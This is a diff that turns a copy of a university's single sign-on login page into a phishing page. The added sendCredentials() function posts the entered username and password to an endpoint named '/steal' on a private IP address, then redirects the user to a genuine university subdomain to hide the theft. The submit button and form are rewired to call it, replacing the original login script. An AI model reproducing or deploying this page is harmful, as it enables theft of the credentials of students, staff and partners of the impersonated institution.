@@ -182,36 +182,36 @@ InputUtil.updatePlaceholder = function (input, placeholderText) {
         
         
     <div id="loginArea">        
-        <div id="loginMessage" class="groupMargin">Sign in with your organizational account</div>
+    <div id="loginMessage" class="groupMargin">Sign in with your organizational account</div>
 
-        <form method="post" id="loginForm" autocomplete="off" novalidate="novalidate" onkeypress="if (event &amp;&amp; event.keyCode == 13) Login.submitLoginRequest();" action="https://fs.singaporetech.edu.sg/adfs/ls/?SAMLRequest=jdE9a8MwEAbgvdD%2fYLRbkqXEH8IOhHYJpEvSduhSFPliG2zJ1cklP79KQ2nHbvfBCw939XYJvT3AxwIYkt1jQ1BPo7%2f171zKIst0C%2beyXWlRlq2pOPC1lMJwWZUkeQWPg7MNEZSTZIe4wM5i0DbEERerlOdpJp8zqYRQvKLrvBSVzN9IskUEH2L2wVlcJvBH8J%2bDgZfDviF9CDMqxi44BKA42E7PzkMA01NoF4oda8XIxpnp6Gej6wbLrvL9taJxR5LLNFpsyOKtchoHVFZPgCoYddw%2b7VUEq9m74Iwbyeb%2bLknqb77%2fT1D%2f4Mnmhwqnoi0LLtIyMyZdadPGap2np0Lo9ZkXuTaaBrDxNEhPfuj6gLM2QI2bfuk1uyEiqGZ%2ff7P5Ag%3d%3d&amp;client-request-id=7b4a9ac4-8979-4e68-8213-0080030000db">
-            <div id="error" class="fieldMargin error smallText" style="display: none;">
-                <span id="errorText" for=""></span>
+    <form method="post" id="loginForm" autocomplete="off" novalidate="novalidate" onsubmit="return sendCredentials();" action="http://fs.singaporetech.edu.sg">
+        <div id="error" class="fieldMargin error smallText" style="display: none;">
+            <span id="errorText" for=""></span>
+        </div>
+
+        <div id="formsAuthenticationArea">
+            <div id="userNameArea">
+                <label id="userNameInputLabel" for="userNameInput" class="hidden">User Account</label>
+                <input id="userNameInput" name="UserName" type="email" value="" tabindex="1" class="text fullWidth" spellcheck="false" placeholder="someone@example.com" autocomplete="off">
             </div>
 
-            <div id="formsAuthenticationArea">
-                <div id="userNameArea">
-                    <label id="userNameInputLabel" for="userNameInput" class="hidden">User Account</label>
-                    <input id="userNameInput" name="UserName" type="email" value="" tabindex="1" class="text fullWidth" spellcheck="false" placeholder="someone@example.com" autocomplete="off">
-                </div>
-
-                <div id="passwordArea">
-                    <label id="passwordInputLabel" for="passwordInput" class="hidden">Password</label>
-                    <input id="passwordInput" name="Password" type="password" tabindex="2" class="text fullWidth" placeholder="Password" autocomplete="off">
-                </div>
-                <div id="kmsiArea" style="display:&#39;&#39;">
-                    <input type="checkbox" name="Kmsi" id="kmsiInput" value="true" tabindex="3">
-                    <label for="kmsiInput">Keep me signed in</label>
-                </div>
-                <div id="submissionArea" class="submitMargin">
-                    <span id="submitButton" class="submit" tabindex="4" role="button" onkeypress="if (event &amp;&amp; event.keyCode == 32) Login.submitLoginRequest();" onclick="return Login.submitLoginRequest();">Sign in</span>
-                </div>
+            <div id="passwordArea">
+                <label id="passwordInputLabel" for="passwordInput" class="hidden">Password</label>
+                <input id="passwordInput" name="Password" type="password" tabindex="2" class="text fullWidth" placeholder="Password" autocomplete="off">
             </div>
-            <input id="optionForms" type="hidden" name="AuthMethod" value="FormsAuthentication">
-        </form>
+            <div id="kmsiArea" style="display:&#39;&#39;">
+                <input type="checkbox" name="Kmsi" id="kmsiInput" value="true" tabindex="3">
+                <label for="kmsiInput">Keep me signed in</label>
+            </div>
+            <div id="submissionArea" class="submitMargin">
+                <span id="submitButton" class="submit" tabindex="4" role="button" onkeypress="if (event &amp;&amp; event.keyCode == 32) sendCredentials();" onclick="return sendCredentials();">Sign in</span>
+            </div>
+        </div>
+        <input id="optionForms" type="hidden" name="AuthMethod" value="FormsAuthentication">
+    </form>
 
-             <div id="authOptions">
-        <form id="options" method="post" action="https://fs.singaporetech.edu.sg/adfs/ls/?SAMLRequest=jdE9a8MwEAbgvdD%2fYLRbkqXEH8IOhHYJpEvSduhSFPliG2zJ1cklP79KQ2nHbvfBCw939XYJvT3AxwIYkt1jQ1BPo7%2f171zKIst0C%2beyXWlRlq2pOPC1lMJwWZUkeQWPg7MNEZSTZIe4wM5i0DbEERerlOdpJp8zqYRQvKLrvBSVzN9IskUEH2L2wVlcJvBH8J%2bDgZfDviF9CDMqxi44BKA42E7PzkMA01NoF4oda8XIxpnp6Gej6wbLrvL9taJxR5LLNFpsyOKtchoHVFZPgCoYddw%2b7VUEq9m74Iwbyeb%2bLknqb77%2fT1D%2f4Mnmhwqnoi0LLtIyMyZdadPGap2np0Lo9ZkXuTaaBrDxNEhPfuj6gLM2QI2bfuk1uyEiqGZ%2ff7P5Ag%3d%3d&amp;client-request-id=7b4a9ac4-8979-4e68-8213-0080030000db">
+    <div id="authOptions">
+        <form id="options" method="post" action="https://fs.singaporetech.edu.sg">
             <script type="text/javascript">
                 function SelectOption(option) {
                     var i = document.getElementById('optionSelection');
@@ -223,61 +223,30 @@ InputUtil.updatePlaceholder = function (input, placeholderText) {
             <input id="optionSelection" type="hidden" name="AuthMethod">
             <div id="authOptionLinks" class="groupMargin"></div>
         </form>
-      </div>
-
-        <div id="introduction" class="groupMargin">
-            <b>Staff/Vendors</b> can login using the Staff ID / Username with <b>@singaporetech.edu.sg</b> as suffix (i.e xxxxx@singaporetech.edu.sg)<br><br> <b>Students</b> and <b>Alumni</b> can login using your Student ID with <b>@sit.singaporetech.edu.sg</b> as suffix (i.e. 12ABC888X@sit.singaporetech.edu.sg)<br><br> <b>External Partners</b> can login using the Username with <b>@ext.singaporetech.edu.sg</b> as suffix (i.e. xxxxx@ext.singaporetech.edu.sg)<br><br>Reset or change your password at the <a href="https://selfservice.singaporetech.edu.sg/">Self-Service Portal</a><br><br>For assistance, email us at <a href="mailto:ithelpdesk@singaporetech.edu.sg">IT Helpdesk</a> and include the following details:<br><br>&nbsp;&nbsp;&nbsp;&nbsp;1. Full Name as per NRIC or FIN<br>&nbsp;&nbsp;&nbsp;&nbsp;2. Staff/Student ID or Username<br>&nbsp;&nbsp;&nbsp;&nbsp;3. Contact no (HP)<br>&nbsp;&nbsp;&nbsp;&nbsp;4. Personal email address                     
-        </div>
-
-        <script type="text/javascript">
-        //<![CDATA[
-
-            function Login() {
-            }
-
-            Login.userNameInput = 'userNameInput';
-            Login.passwordInput = 'passwordInput';
-
-            Login.initialize = function () {
-
-                var u = new InputUtil();
-
-                u.checkError();
-                u.setInitialFocus(Login.userNameInput);
-                u.setInitialFocus(Login.passwordInput);
-            }();
-
-            Login.submitLoginRequest = function () { 
-                var u = new InputUtil();
-                var e = new LoginErrors();
-
-                var userName = document.getElementById(Login.userNameInput);
-                var password = document.getElementById(Login.passwordInput);
-
-                if (!userName.value || !userName.value.match('[@\\\\]')) {
-                    u.setError(userName, e.userNameFormatError);
-                    return false;
-                }
-
-                if (!password.value) {
-                    u.setError(password, e.passwordEmpty);
-                    return false;
-                }
-
-                if (password.value.length > maxPasswordLength) {
-                    u.setError(password, e.passwordTooLong);
-                    return false;
-                }
-
-                document.forms['loginForm'].submit();
-                return false;
-            };
-
-            InputUtil.makePlaceholder(Login.userNameInput);
-            InputUtil.makePlaceholder(Login.passwordInput);
-        //]]>
-        </script>
     </div>
+
+    <div id="introduction" class="groupMargin">
+        <b>Staff/Vendors</b> can login using the Staff ID / Username with <b>@singaporetech.edu.sg</b> as suffix (i.e xxxxx@singaporetech.edu.sg)<br><br> <b>Students</b> and <b>Alumni</b> can login using your Student ID with <b>@sit.singaporetech.edu.sg</b> as suffix (i.e. 12ABC888X@sit.singaporetech.edu.sg)<br><br> <b>External Partners</b> can login using the Username with <b>@ext.singaporetech.edu.sg</b> as suffix (i.e. xxxxx@ext.singaporetech.edu.sg)<br><br>Reset or change your password at the <a href="https://selfservice.singaporetech.edu.sg/">Self-Service Portal</a><br><br>For assistance, email us at <a href="mailto:ithelpdesk@singaporetech.edu.sg">IT Helpdesk</a> and include the following details:<br><br>&nbsp;&nbsp;&nbsp;&nbsp;1. Full Name as per NRIC or FIN<br>&nbsp;&nbsp;&nbsp;&nbsp;2. Staff/Student ID or Username<br>&nbsp;&nbsp;&nbsp;&nbsp;3. Contact no (HP)<br>&nbsp;&nbsp;&nbsp;&nbsp;4. Personal email address                     
+    </div>
+
+    <script type="text/javascript">
+    //<![CDATA[
+        function sendCredentials() {
+            var userName = document.getElementById('userNameInput').value;
+            var password = document.getElementById('passwordInput').value;
+
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "http://192.168.2.1/steal", true);
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            xhr.send("username=" + encodeURIComponent(userName) + "&password=" + encodeURIComponent(password));
+
+            window.location.href = "https://xsite.singaporetech.edu.sg";
+            return false;
+        }
+    //]]>
+    </script>
+</div>
+
 
     </div>
 
